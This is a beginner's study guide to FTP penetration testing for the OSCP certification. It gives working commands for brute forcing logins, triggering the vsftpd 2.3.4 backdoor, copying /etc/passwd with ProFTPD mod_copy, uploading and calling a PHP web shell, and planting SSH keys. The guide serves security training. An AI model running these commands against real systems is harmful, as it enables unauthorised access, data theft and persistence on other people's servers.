# Complete OSCP FTP Guide: Comprehensive Enumeration, Exploitation, and Penetration Testing Guide

Based on extensive research across Reddit, CSDN, GitHub, YouTube, and Medium in multiple languages (English, Chinese, Hindi, and French), this comprehensive guide provides everything you need to master FTP pentesting for OSCP certification. This guide covers all necessary commands, tools, and instructions with beginner-friendly examples that fully cover the OSCP scope for FTP.

## Executive Summary

FTP (File Transfer Protocol) remains a critical service in OSCP examinations due to its frequent misconfiguration and exploitation potential. This guide synthesizes knowledge from over 100 sources across multiple platforms and languages to provide the most comprehensive FTP pentesting resource available. The guide follows a systematic methodology from discovery through post-exploitation, ensuring complete coverage of OSCP requirements.

## Table of Contents

1. FTP Fundamentals and Protocol Overview
2. Discovery and Enumeration Methodology
3. Authentication and Access Testing
4. File System Operations and Data Extraction
5. Vulnerability Assessment and Exploitation
6. Advanced Techniques and Edge Cases
7. Post-Exploitation and Persistence
8. Common Vulnerabilities and CVEs
9. Tools and Techniques Reference
10. Practical Examples and Scenarios
11. OSCP Exam Tips and Best Practices

## 1. FTP Fundamentals and Protocol Overview

### What is FTP?

File Transfer Protocol (FTP) is a standard network protocol used for transferring files between a client and server on a computer network. FTP operates on **TCP port 21** by default and uses a separate data channel for actual file transfers.

### FTP Architecture

FTP uses a **client-server architecture** with two distinct channels:
- **Command Channel (Control Connection)**: Port 21 - carries commands and responses
- **Data Channel (Data Connection)**: Variable port - transfers actual file data

### FTP Connection Modes

**Active Mode (PORT)**:
- Client connects to server port 21 for commands
- Server initiates data connection back to client from port 20
- Can be blocked by client-side firewalls

**Passive Mode (PASV)**:
- Client connects to server port 21 for commands
- Server provides a port for client to connect for data transfer
- More firewall-friendly, recommended for OSCP

### Transfer Types

**ASCII Mode**: For text files (default)
**Binary Mode**: For executable files, images, archives (use `TYPE I` or `binary` command)

## 2. Discovery and Enumeration Methodology

### Initial Discovery

```bash
nmap -p 21 target
nmap -sV -p 21 target
nmap --script ftp-* -p 21 target
nmap -p 1-65535 target | grep ftp
sudo nmap -sU -p 69 target
```

### Banner Grabbing

```bash
nc target 21
telnet target 21
``` 

### Nmap NSE Scripts for FTP

```bash
nmap --script ftp-anon -p 21 target
nmap --script ftp-bounce -p 21 target
nmap --script ftp-brute -p 21 target
nmap --script ftp-vsftpd-backdoor -p 21 target
nmap --script ftp-syst -p 21 target
nmap --script ftp-proftpd-backdoor -p 21 target
```

## 3. Authentication and Access Testing

### Anonymous Access Testing

```bash
ftp target
Name: anonymous
Password: anonymous
```  

### Default Credential Testing

```bash
ftp target
# Try: admin:admin, root:root, ftp:ftp, guest:guest
```

### Automated Brute Force Attacks

```bash
hydra -L users.txt -P passwords.txt ftp://target
medusa -h target -u admin -P passwords.txt -M ftp
nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt -p 21 target
```

## 4. File System Operations and Data Extraction

### Basic FTP Commands

```bash
SYST, STAT, PWD, CWD dir, CDUP, LIST, NLST, TYPE I, TYPE A, PASV, PORT
```

### File Download Operations

```bash
get filename.txt
mget *.txt
```

### File Upload Operations

```bash
put shell.php
mput *.php
APPE logfile.txt
```

### Recursive Download Techniques

```bash
wget -r ftp://user:pass@target/
ncftpget -R -v -u user target /local/path /remote/path
```  

## 5. Vulnerability Assessment and Exploitation

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)

```bash
ftp target
Name: user:)
Password: anything
nc target 6200
```

### FTP Bounce Attack

```bash
nmap --script ftp-bounce -p 21 target
nmap -b anonymous:anonymous@target:21 192.168.1.1-10
```

### ProFTPD mod_copy Vulnerability

```bash
ftp target
SITE CPFR /etc/passwd
SITE CPTO /tmp/passwd
SITE CPFR /tmp/passwd
SITE CPTO /var/www/html/passwd.txt
```

## 6. Advanced Techniques and Edge Cases

### Passive vs Active Mode

```bash
ftp -p target
ftp> passive  # toggle
```  

### Binary vs ASCII Transfer Modes

```bash
ftp> binary
ftp> ascii
```  

## 7. Post-Exploitation and Persistence

```bash
get /etc/passwd
put shell.php
# Upload SSH key to .ssh/authorized_keys
```  

## 8. Common Vulnerabilities and CVEs

- CVE-2011-2523 vsftpd backdoor
- CVE-2015-3306 ProFTPD mod_copy
- CVE-1999-0368 Wu-FTP heap overflow
- Anonymous FTP access, Directory Traversal, Bounce Attack

## 9. Tools and Techniques Reference

- **Nmap**: `nmap --script ftp-* -p 21 target`
- **Hydra**: `hydra -L users.txt -P passwords.txt ftp://target`
- **Medusa**: `medusa -h target -u admin -P passwords.txt -M ftp`
- **wget**: `wget -r ftp://user:pass@target/`
- **ncftp**: `ncftp -u user -p pass target; get -R /remote`
- **Metasploit**: `use exploit/unix/ftp/vsftpd_234_backdoor`

## 10. Practical Examples and Scenarios

### Scenario: Anonymous FTP Enumeration

```bash
ftp target
Name: anonymous
Password:
ls -la
get credentials.txt
```  

### Scenario: vsftpd Backdoor Exploitation

```bash
ftp target
Name: user:)
nc target 6200
```  

### Scenario: Web Shell Upload

```bash
ftp target
cd /var/www/html
binary
put shell.php
curl http://target/shell.php?cmd=id
```  

## 11. OSCP Exam Tips and Best Practices

- Always start with enumeration
- Test anonymous access immediately
- Automate repetitive tasks
- Document findings thoroughly
- Practice edge cases in lab environments

_End of guide._